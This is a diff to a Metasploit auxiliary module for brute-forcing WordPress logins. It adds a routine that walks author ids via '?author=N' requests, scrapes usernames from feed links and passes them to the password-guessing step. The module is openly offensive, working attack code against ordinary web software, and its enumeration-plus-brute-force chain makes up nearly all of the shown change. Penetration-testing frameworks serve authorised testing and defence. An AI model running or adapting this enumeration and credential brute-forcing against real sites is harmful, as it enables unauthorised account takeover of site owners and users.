@@ -1,13 +1,11 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
 #   http://metasploit.com/
 ##
+
+require 'uri'
 
 
 class Metasploit3 < Msf::Auxiliary
@@ -20,12 +18,12 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'           => 'Wordpress Brute Force and User Enumeration Utility',
-			'Version'        => '$Revision$',
-			'Description'    => 'Wordpress Authentication Brute Force and User Enumeration Utility',
-			'Author'         => [
+			'Name'		   => 'Wordpress Brute Force and User Enumeration Utility',
+			'Description'	=> 'Wordpress Authentication Brute Force and User Enumeration Utility',
+			'Author'		 => [
 				'Alligator Security Team',
-				'Tiago Ferreira <tiago.ccna[at]gmail.com>'
+				'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+				'Zach Grace <zgrace[at]404labs.com>'
 		],
 			'References'     =>
 				[
@@ -39,8 +37,11 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('URI', [false, 'Define the path to the wp-login.php file', '/wp-login.php']),
-				OptBool.new('VALIDATE_USERS', [ true, "Enumerate usernames", true ]),
+				OptBool.new('VALIDATE_USERS', [ true, "Validate usernames", true ]),
 				OptBool.new('BRUTEFORCE', [ true, "Perform brute force authentication", true ]),
+				OptBool.new('ENUMERATE_USERNAMES', [ true, "Enumerate usernames", true ]),
+				OptString.new('RANGE_START', [false, 'First user id to enumerate', '1']),
+				OptString.new('RANGE_END', [false, 'Last user id to enumerate', '10']),
 		], self.class)
 
 	end
@@ -51,6 +52,9 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run_host(ip)
+		if datastore['ENUMERATE_USERNAMES']
+			enum_usernames
+		end
 		if datastore['VALIDATE_USERS']
 			@users_found = {}
 			vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
@@ -179,6 +183,45 @@ class Metasploit3 < Msf::Auxiliary
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
+		end
+	end
+
+	def enum_usernames()
+		usernames = Tempfile.new('wp_enum')
+		begin
+			for i in datastore['RANGE_START']..datastore['RANGE_END']
+				uri = "#{datastore['URI'].gsub(/wp-login/, 'index')}?author=#{i}"
+				print_status "Requesting #{uri}"
+				res = send_request_cgi({
+					'method' => 'GET',
+					'uri' => uri
+				})
+
+				if (res and res.code == 301)
+					uri = URI(res.headers['Location'])
+					uri = "#{uri.path}?#{uri.query}"
+					res = send_request_cgi({
+						'method' => 'GET',
+						'uri' => uri
+					})
+				end
+
+				if (res == nil)
+					print_error("Error getting response.")
+				elsif (res.code == 200)
+					#username = /<link rel="alternate" type="application\/rss\+xml" title=".*" href="http[s]*:\/\/.*\/(.*)\/feed\/" \/>/.match(res.body.to_s)[1]
+					username = /href="http[s]*:\/\/.*\/author\/(.*)\/feed\//.match(res.body.to_s)[1]
+					usernames.write("#{username}\n")
+					print_good "Found user #{username} with id #{i}"
+				elsif (res.code == 404)
+					print_status "No user with id #{i} found"
+				else
+					print_error "Error, #{res.code} returned."
+				end
+			end
+		ensure
+			datastore['USER_FILE'] = usernames.path
+			usernames.close
 		end
 	end
 end
